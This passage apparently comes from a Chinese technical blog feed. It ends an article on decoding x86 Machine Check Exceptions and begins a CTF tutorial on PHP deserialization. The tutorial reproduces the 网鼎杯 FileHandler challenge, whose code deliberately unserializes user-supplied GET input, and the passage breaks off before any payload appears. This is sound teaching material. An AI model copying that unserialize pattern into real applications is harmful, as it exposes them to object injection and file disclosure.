class="line">  __asm__ __volatile__ (</span><br><span class="line">    &quot;wrmsr&quot;</span><br><span class="line">    :</span><br><span class="line">    : &quot;c&quot; (Index),</span><br><span class="line">      &quot;a&quot; (LowData),</span><br><span class="line">      &quot;d&quot; (HighData)</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">  return Value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>汇编版：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;-------------------------------------------------------</span><br><span class="line">; UINT64</span><br><span class="line">; EFIAPI</span><br><span class="line">; AsmReadMsr64 (</span><br><span class="line">;   IN UINT64  Index</span><br><span class="line">;   );</span><br><span class="line">;-------------------------------------------------------</span><br><span class="line">AsmReadMsr64    PROC</span><br><span class="line">    mov     ecx, [esp + 4]</span><br><span class="line">    rdmsr</span><br><span class="line">    ret</span><br><span class="line">AsmReadMsr64    ENDP</span><br><span class="line"> </span><br><span class="line">;-------------------------------------------------------</span><br><span class="line">; UINT64</span><br><span class="line">; EFIAPI</span><br><span class="line">; AsmWriteMsr64 (</span><br><span class="line">;   IN UINT32  Index,</span><br><span class="line">;   IN UINT64  Value</span><br><span class="line">;   );</span><br><span class="line">;--------------------------------------------------------</span><br><span class="line">AsmWriteMsr64   PROC</span><br><span class="line">    mov     edx, [esp + 12]</span><br><span class="line">    mov     eax, [esp + 8]</span><br><span class="line">    mov     ecx, [esp + 4]</span><br><span class="line">    wrmsr</span><br><span class="line">    ret</span><br><span class="line">AsmWriteMsr64   ENDP</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="MCE"><a href="#MCE" class="headerlink" title="MCE"></a>MCE</h1><p>Machine Check Exception (MCE) 是CPU发现硬件错误时触发的异常(exception)，中断号是18，异常的类型是abort：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122150211454.png" alt="image-20210122150211454"></p>
<h2 id="导致MCE的原因"><a href="#导致MCE的原因" class="headerlink" title="导致MCE的原因"></a>导致MCE的原因</h2><p>导致mce的原因主要有：总线故障、内存ECC校验错、cache错误、TLB错误、内部时钟错误，等等。不仅硬件故障会引起MCE，不恰当的BIOS配置、firmware bug、软件bug也有可能引起MCE。</p>
<p>在 Linux 系统上，如果发生的MCE错误属于可以自动纠正的类型，那么系统保持继续运行，MCE错误日志会记录在一个ring buffer中（这个ring buffer通过设备文件/dev/mcelog来访问），用 mcelog(8) 命令可以读取MCE日志，系统通常会通过cron任务或者mcelog.service把ring buffer中的MCE日志写入/var/log/mcelog文件中。如果发生的MCE错误属于无法恢复的类型，那么系统会panic，错误信息会输出在终端上和message buffer里。</p>
<h1 id="分析MCE"><a href="#分析MCE" class="headerlink" title="分析MCE"></a>分析MCE</h1><p>分析MCE需要参考Intel手册第3卷，15章Machine-Check Architecture和16章Interpreting Machine-Check Error Codes。由于MCE在不同型号的CPU上有差异，解读的方法也有不同，第16章是专门解释在不同的CPU型号上如何解读MCE错误码。</p>
<p>每个CPU上有一组寄存器称为 Machine-Check MSR (Model-Specific Register)，用于Machine-Check的控制与记录，分为全局寄存器和若干Bank寄存器（CPU的硬件单元分成若干组，每一组称为一个Bank）。当发生MCE时，错误信息记录在全局状态寄存器 MCG_STATUS MSR 和Bank寄存器 MCi_STATUS MSR 中，如下图黄色框所示：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122150307976.png" alt="image-20210122150307976"></p>
<p>分析MCE的方法，就是根据Intel手册解读上述寄存器中记录的错误信息。Linux内核把MCE的信息保存在下面的结构体中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;arch&#x2F;x86&#x2F;include&#x2F;asm&#x2F;mce.h ：</span><br><span class="line"> </span><br><span class="line">0067 struct mce &#123;</span><br><span class="line">0068         __u64 status;  &#x2F;* 对应 IA32_MCi_STATUS MSR *&#x2F;</span><br><span class="line">0069         __u64 misc;</span><br><span class="line">0070         __u64 addr;</span><br><span class="line">0071         __u64 mcgstatus;&#x2F;*对应 IA32_MCG_STATUS MSR *&#x2F;</span><br><span class="line">0072         __u64 ip;</span><br><span class="line">0073         __u64 tsc;      &#x2F;* cpu time stamp counter *&#x2F;</span><br><span class="line">0074         __u64 time;     &#x2F;* wall time_t when error was detected *&#x2F;</span><br><span class="line">0075         __u8  cpuvendor;        &#x2F;* cpu vendor as encoded in system.h *&#x2F;</span><br><span class="line">0076         __u8  inject_flags;     &#x2F;* software inject flags *&#x2F;</span><br><span class="line">0077         __u16  pad;</span><br><span class="line">0078         __u32 cpuid;    &#x2F;* CPUID 1 EAX *&#x2F;</span><br><span class="line">0079         __u8  cs;               &#x2F;* code segment *&#x2F;</span><br><span class="line">0080         __u8  bank;     &#x2F;* machine check bank *&#x2F;</span><br><span class="line">0081         __u8  cpu;      &#x2F;* cpu number; obsolete; use extcpu now *&#x2F;</span><br><span class="line">0082         __u8  finished;   &#x2F;* entry is valid *&#x2F;</span><br><span class="line">0083         __u32 extcpu;   &#x2F;* linux cpu number that detected the error *&#x2F;</span><br><span class="line">0084         __u32 socketid; &#x2F;* CPU socket ID *&#x2F;</span><br><span class="line">0085         __u32 apicid;   &#x2F;* CPU initial apic ID *&#x2F;</span><br><span class="line">0086         __u64 mcgcap;   &#x2F;* MCGCAP MSR: machine check capabilities of CPU *&#x2F;</span><br><span class="line">0087 &#125;;</span><br></pre></td></tr></table></figure>

<p>下面的MCE错误信息截取自一台因MCE而crash的机器，我们以此为例来解读一下MCE信息。<br>注：产生以下信息的内核函数是：<br>static void print_mce(struct mce *m)<br>源程序：arch/x86/kernel/cpu/mcheck/mce.c<br>如果需要的话，阅读源程序可以理解输出的信息与原始数据的对应关系。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Hardware Error]: CPU 3: Machine Check Exception: 4 Bank 5: be00000000800400</span><br><span class="line">[Hardware Error]: TSC 128727f47a97 ADDR 3f628bd69349 MISC 1 </span><br><span class="line">[Hardware Error]: PROCESSOR 0:106a5 TIME 1450279905 SOCKET 1 APIC 14</span><br><span class="line">[Hardware Error]: Machine check: Processor context corrupt</span><br><span class="line">Kernel panic - not syncing: Fatal Machine check</span><br></pre></td></tr></table></figure>

<p>其中CPU和Bank是MCE的接收者：</p>
<ul>
<li>CPU 3 – 表示检测到MCE错误的是3号CPU，对应struct mce的extcpu字段；</li>
<li>Bank 5 – 一组硬件单元称为一个bank，每个bank对应一组machine-check寄存器；</li>
</ul>
<p>MCE的错误代码包括两部分：</p>
<ul>
<li>Machine Check Exception: 4 – 表示 IA32_MCG_STATUS MSR寄存器的状态码是4（含义见后文），对应 mcgstatus字段；</li>
<li>be00000000800400 – 表示 IA32_MCi_STATUS MSR寄存器中的错误码（含义见后文），对应status字段。</li>
</ul>
<h2 id="Machine-Check-Excheption-4-的含义"><a href="#Machine-Check-Excheption-4-的含义" class="headerlink" title="Machine Check Excheption: 4 的含义"></a>Machine Check Excheption: 4 的含义</h2><p>它来自全局状态寄存器 IA32_MCG_STATUS MSR，(对应struct mce的 mcgstatus字段)，只用到三个bit，如下所示。4表示machine-check in progress。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122150512960.png" alt="image-20210122150512960"></p>
<ul>
<li>Bit 0: Restart IP Valid. 表示程序的执行是否可以在被异常中断的指令处重新开始。</li>
<li>Bit 1: Error IP Valid. 表示被中断的指令是否与MCE错误直接相关。</li>
<li>Bit 2: Machine Check In Progress. 表示 machine check 正在进行中。</li>
</ul>
<h2 id="be00000000800400-的含义"><a href="#be00000000800400-的含义" class="headerlink" title="be00000000800400 的含义"></a>be00000000800400 的含义</h2><p>它来自bank寄存器IA32_MCi_STATUS MSR，(对应struct mce的status字段)。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/MCi_status.png" alt="ia32-mci"></p>
<p>be00000000800400 的二进制位如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Bit 63: VAL. 表示本寄存器中包含有效的错误码</span><br><span class="line">Bit 61: UC. 表示是无法纠正的MCE</span><br><span class="line">Bit 60: EN. 表示处于允许报告错误的状态</span><br><span class="line">Bit 59: MISCV. 表示MCi_MISC寄存器中含有对该错误的补充信息</span><br><span class="line">Bit 58: ADDRV. 表示MCi_ADDR寄存器含有发生错误的内存地址</span><br><span class="line">Bit 57: PCC. 表示该CPU的上下文状态已被该错误破坏，无法恢复软件代码的运行</span><br><span class="line">Bits [16:31] 包含特定CPU型号相关的扩展错误码. 本例中是0x0080.</span><br><span class="line">Bits [0:15] 包含MCE错误码，该错误码是所有CPU型号通用的，分为两类：simple error codes（简单错误码） 和 compound error codes（复合错误码）</span><br></pre></td></tr></table></figure>

<p>本例中0x0400表示Internal timer error：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">– Simple Error Codes:</span><br><span class="line">0000 0000 0000 0000 – 没有错误.</span><br><span class="line">0000 0000 0000 0001 – Unclassified. 未分类的错误类型.</span><br><span class="line">0000 0000 0000 0010 – ROM微码校验错</span><br><span class="line">0000 0000 0000 0011 – MCE是由于别的CPU的BINT# 引起的.</span><br><span class="line">0000 0000 0000 0100 – Functional redundancy check (FRC) master&#x2F;slave error.</span><br><span class="line">0000 0000 0000 0101 – Internal parity error.</span><br><span class="line">0000 0100 0000 0000 – Internal timer error.</span><br><span class="line">0000 01xx xxxx xxxx – Internal unclassified error. 至少有一个x等于1</span><br><span class="line"></span><br><span class="line">– Compound Error Codes:</span><br><span class="line">000F 0000 0000 11LL – Generic cache hierarchy errors.</span><br><span class="line">000F 0000 0001 TTLL – TLB errors.</span><br><span class="line">000F 0000 1MMM CCCC – Memory controller errors (Intel-only).</span><br><span class="line">000F 0001 RRRR TTLL – Memory errors in the cache hierarchy.</span><br><span class="line">000F 1PPT RRRR IILL – Bus and interconnect errors.</span><br></pre></td></tr></table></figure>

<p>下一步，由于Bits [16:31] 是非零值0x0080，包含的是特定CPU型号相关的扩展错误码，我们要参考Intel手册第三卷第16章。首先确定CPU型号，我们需要的是CPU faimily和model，从/proc/cpuinfo中可以找到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># less &#x2F;proc&#x2F;cpuinfo</span><br><span class="line">...</span><br><span class="line">processor       : 3</span><br><span class="line">vendor_id       : GenuineIntel</span><br><span class="line">cpu family      : 6</span><br><span class="line">model           : 26</span><br><span class="line">model name      : Intel(R) Xeon(R) CPU           L5520  @ 2.27GHz</span><br><span class="line">stepping        : 5</span><br><span class="line">cpu MHz         : 2266.700</span><br><span class="line">cache size      : 8192 KB</span><br><span class="line">physical id     : 1</span><br><span class="line">siblings        : 8</span><br><span class="line">core id         : 2</span><br><span class="line">cpu cores       : 4</span><br><span class="line">apicid          : 20</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>根据cpu family/model，即06_1AH，找到Intel手册中对应的章节，但是没找到匹配Internal timer error和0x0080的条目。所以只能到此为止了。</p>
<p>所以MCE检测的错误为：</p>
<blockquote>
<p>CPU 3 发现了无法纠正的MCE，是Internal timer error，被中断的指令与MCE不相关，被中断的程序指令不能恢复运行，CPU的上下文已被MCE破坏</p>
</blockquote>
<h1 id="如何禁用MCE"><a href="#如何禁用MCE" class="headerlink" title="如何禁用MCE"></a>如何禁用MCE</h1><p>可以在 /boot/grub/grub.conf 中加入以下内容：mce=off</p>
<p>还有其它的MCE选项，比如禁用CMCI(Corrected Machine Check Interrupt)，或者禁用MCE日志，等等，例如：<br>mce=off  — Disable machine check<br>mce=no_cmci  — Disable CMCI(Corrected Machine Check Interrupt)</p>
<p>参见文档：Documentation/x86/x86_64/boot-options.txt</p>
<p>每个 CPU 都有一个sysfs接口：<br>/sys/devices/system/machinecheck/machinecheckN<br>注：(N = CPU number)</p>
<p>其中包含的可调参数参见：Documentation/x86/x86_64/machinecheck</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html">Intel 64 and IA-32 Architectures Software Developer’s Manual</a></p>
<p><a href="http://amd-dev.wpengine.netdna-cdn.com/wordpress/media/2012/10/24593_APM_v21.pdf">AMD64 Architecture Programmer’s Manual Volume 2: System Programming</a></p>
<p><a href="http://linuxperf.com/?p=105">http://linuxperf.com/?p=105</a></p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>MCA</tag>
        <tag>MCE</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化学习与实践</title>
    <url>/2021/01/22/CTF/Web/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><blockquote>
<p>反序列化：PHP程序为了保存和转储对象，提供了序列化的方法，PHP序列化是为了在程序运行的过程中对对象进行转储而产生的。序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保留函数方法。</p>
<p>基本上都是围绕这两个函数来展开的，通俗的说反序列化和序列化的意思。</p>
<p>序列化：将对象转换成字符串。</p>
<p>反序列化：将序列化后的字符串转换为对象还原。</p>
<p>这两个关系相当于一正一反。</p>
</blockquote>
<a id="more"></a>

<h1 id="PHP序列化"><a href="#PHP序列化" class="headerlink" title="PHP序列化"></a>PHP序列化</h1><blockquote>
<p>PHP序列化的函数为serialize。反序列化的函数为unserialize。</p>
<p>反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控</p>
</blockquote>
<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class test</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    private $flag &#x3D; &quot;111&quot;;</span><br><span class="line">    protected $a1 &#x3D; &quot;aaa&quot;;</span><br><span class="line">    public $b2 &#x3D; &quot;bbb&quot;;</span><br><span class="line"></span><br><span class="line">    public function set_flag($flag)</span><br><span class="line">    &#123;</span><br><span class="line">    	$this-&gt;flag &#x3D; $flag;</span><br><span class="line">    &#125;</span><br><span class="line">	public function get_flag()</span><br><span class="line">	&#123;</span><br><span class="line">		return $this-&gt;flag;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">    $test &#x3D; new test;</span><br><span class="line">    $test-&gt;set_flag(&#39;ol4three&#39;);</span><br><span class="line">    $data &#x3D; serialize($test);</span><br><span class="line">    echo $data;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>反序列化可以控制类属性，无论是private还是public</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ php test.php</span><br><span class="line">O:4:&quot;test&quot;:3:&#123;s:10:&quot;testflag&quot;;s:8:&quot;ol4three&quot;;s:5:&quot;*a1&quot;;s:3:&quot;aaa&quot;;s:2:&quot;b2&quot;;s:3:&quot;bbb&quot;;&#125;</span><br><span class="line">O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122153805620.png" alt="image-20210122153805620"></p>
<p>这里说明一下序列化字符串的含义：<br><code>O:4:&quot;test&quot;</code>指Object(对象) 4个字符:test<br><code>:3</code>对象属性个数为3<br>{}中为属性字符数：属性值</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122154217382.png" alt="image-20210122154217382"></p>
<p><em>注意：如果你是细心的同学，你可能会注意到一个小问题，按照我前面对象名的格式算的话你可能会发现后面的属性名有些另类，你看啊,我代码里面明明写的是<br>flag 属性，序列化以后却变成了 testflag ，而且前面说好的长度也不一样了，testflag<br>明明是8个字符，到你这里却成了10个，除此之外后面的 test 属性也“变异了”，前面多了个（</em>）并且长度也不对，这到底是为什么呢？</p>
<blockquote>
<p>这涉及到PHP的属性的访问权限序列化为了能把整个类对象的各种信息完完整整的压缩，格式化，必然也会将属性的权限序列化进去，我们发现我们定义的类的属性有三种 private protected 和 默认的 public(默认属性)，其中</p>
</blockquote>
<h3 id="1-Public权限"><a href="#1-Public权限" class="headerlink" title="1.Public权限"></a>1.Public权限</h3><p>Public是几个字符就是几个字符</p>
<h3 id="2-Private-权限"><a href="#2-Private-权限" class="headerlink" title="2.Private 权限"></a>2.Private 权限</h3><p>该权限是私有权限，也就是说只能 test类使用，于是在序列化的时候必须加入一些标志，所以私有属性序列化为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%00类名%00属性名</span><br></pre></td></tr></table></figure>

<p>查看一下我们的序列化的结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ php test.php &gt; a.txt</span><br><span class="line">╰─$ xxd  a.txt</span><br><span class="line">00000000: 4f3a 343a 2274 6573 7422 3a33 3a7b 733a  O:4:&quot;test&quot;:3:&#123;s:</span><br><span class="line">00000010: 3130 3a22 0074 6573 7400 666c 6167 223b  10:&quot;.test.flag&quot;;</span><br><span class="line">00000020: 733a 383a 226f 6c34 7468 7265 6522 3b73  s:8:&quot;ol4three&quot;;s</span><br><span class="line">00000030: 3a35 3a22 002a 0061 3122 3b73 3a33 3a22  :5:&quot;.*.a1&quot;;s:3:&quot;</span><br><span class="line">00000040: 6161 6122 3b73 3a32 3a22 6232 223b 733a  aaa&quot;;s:2:&quot;b2&quot;;s:</span><br><span class="line">00000050: 333a 2262 6262 223b 7d                   3:&quot;bbb&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122155117222.png" alt="image-20210122155117222"></p>
<h3 id="3-Protected"><a href="#3-Protected" class="headerlink" title="3.Protected"></a>3.Protected</h3><p>根据上图的结果可以看到Protected的序列化结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%00*%00属性名</span><br></pre></td></tr></table></figure>



<h2 id="编写反序列化"><a href="#编写反序列化" class="headerlink" title="编写反序列化"></a>编写反序列化</h2><p>代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class test</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    private $flag &#x3D; &quot;111&quot;;</span><br><span class="line">    protected $a1 &#x3D; &quot;aaa&quot;;</span><br><span class="line">    public $b2 &#x3D; &quot;bbb&quot;;</span><br><span class="line"></span><br><span class="line">    public function set_flag($flag)</span><br><span class="line">    &#123;</span><br><span class="line">    	$this-&gt;flag &#x3D; $flag;</span><br><span class="line">    &#125;</span><br><span class="line">	public function get_flag()</span><br><span class="line">	&#123;</span><br><span class="line">		return $this-&gt;flag;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">    $test &#x3D; file_get_contents(&#39;a.txt&#39;);</span><br><span class="line">    $test &#x3D; unserialize($test);</span><br><span class="line">    echo $test-&gt;b2.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo $test-&gt;get_flag();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ php test1.php</span><br><span class="line">bbb&lt;br&gt;ol4three%</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122155845669.png" alt="image-20210122155845669"></p>
<h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><ul>
<li>__construct：在创建对象时候初始化对象，一般用于对变量赋初值。</li>
<li>__destruct：和构造函数相反，当对象所在函数调用完毕后执行。</li>
<li>__toString：当对象被当做一个字符串使用时调用。</li>
<li>__sleep：序列化对象之前就调用此方法(其返回需要一个数组)。</li>
<li>__wakeup：反序列化恢复对象之前调用该方法。</li>
<li>__call：当调用对象中不存在的方法会自动调用该方法。</li>
<li>__get：在调用私有属性的时候会自动执行。</li>
<li>__isset( )在不可访问的属性上调用isset( )或empty( )触发。</li>
<li>__unset( )在不可访问的属性上使用unset( )时触发。</li>
</ul>
<h2 id="比较重要的方法"><a href="#比较重要的方法" class="headerlink" title="比较重要的方法"></a>比较重要的方法</h2><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><blockquote>
<p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p>
</blockquote>
<p>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p>
<h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><blockquote>
<p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p>
</blockquote>
<p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p>
<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Caiji&#123;</span><br><span class="line">    public function __construct($ID, $sex, $age)&#123;</span><br><span class="line">        $this-&gt;ID &#x3D; $ID;</span><br><span class="line">        $this-&gt;sex &#x3D; $sex;</span><br><span class="line">        $this-&gt;age &#x3D; $age;</span><br><span class="line">        $this-&gt;info &#x3D; sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        echo $this-&gt;info . &#39;&lt;br&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * serialize前调用 用于删选需要被序列化存储的成员变量</span><br><span class="line">     * @return array [description]</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function __sleep()&#123;</span><br><span class="line">        echo __METHOD__ . &#39;&lt;br&gt;&#39;;</span><br><span class="line">        return [&#39;ID&#39;, &#39;sex&#39;, &#39;age&#39;];</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * unserialize前调用 用于预先准备对象资源</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo __METHOD__ . &#39;&lt;br&gt;&#39;;</span><br><span class="line">        $this-&gt;info &#x3D; sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$me &#x3D; new Caiji(&#39;twosmi1e&#39;, 20, &#39;male&#39;);</span><br><span class="line"></span><br><span class="line">$me-&gt;getInfo();</span><br><span class="line">&#x2F;&#x2F;存在__sleep(函数，$info属性不会被存储</span><br><span class="line">$temp &#x3D; serialize($me);</span><br><span class="line">echo $temp . &#39;&lt;br&gt;&#39;;</span><br><span class="line"></span><br><span class="line">$me &#x3D; unserialize($temp);</span><br><span class="line">&#x2F;&#x2F;__wakeup()组装的$info</span><br><span class="line">$me-&gt;getInfo();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122163525137.png" alt="image-20210122163525137"></p>
<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><blockquote>
<p>__toString()方法用于一个类被当成字符串时应怎样回应。例如echo $obj; 应该是显示些什么。此方法必须返回一个字符串，否则将发出一条E_RECOVERABLE_ERROR级别的致命错误</p>
</blockquote>
<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Caiji&#123;</span><br><span class="line">    public function __construct($ID, $sex, $age)&#123;</span><br><span class="line">        $this-&gt;ID &#x3D; $ID;</span><br><span class="line">        $this-&gt;sex &#x3D; $sex;</span><br><span class="line">        $this-&gt;age &#x3D; $age;</span><br><span class="line">        $this-&gt;info &#x3D; sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$me &#x3D; new Caiji(&#39;ol4three&#39;, 18, &#39;male&#39;);</span><br><span class="line">echo &#39;__toString:&#39; . $me . &#39;&lt;br&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210122164141294.png" alt="image-20210122164141294"></p>
<h3 id="热身题"><a href="#热身题" class="headerlink" title="热身题"></a>热身题</h3><p>实例：</p>
<p>题目是网鼎杯中青龙组的一道历年真题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op &#x3D; &quot;1&quot;;</span><br><span class="line">        $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;;</span><br><span class="line">        $content &#x3D; &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;</span><br><span class="line">            $res &#x3D; $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res &#x3D; &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res &#x3D; file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)</span><br><span class="line">            $this-&gt;op &#x3D; &quot;1&quot;;</span><br><span class="line">        $this-&gt;content &#x3D; &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str &#x3D; (string)$_GET[&#39;str&#39;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj &#x3D; unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str &#x3D; (string)$_GET[&#39;str&#39;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj &#x3D; unserialize($str);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>isset判断get传过来的参数有没有数据。然后if判断，这里用到了一个过滤的函数，我们不用管。</p>
<p>$obj = unserialize($str)；这里使用到了一个反序列化的函数。反序列化GET传过来的参数。</p>
<pre><code>function __destruct() &#123;
    if($this-&gt;op === &quot;2&quot;)
        $this-&gt;op = &quot;1&quot;;
    $this-&gt;content = &quot;&quot;;
    $this-&gt;process();
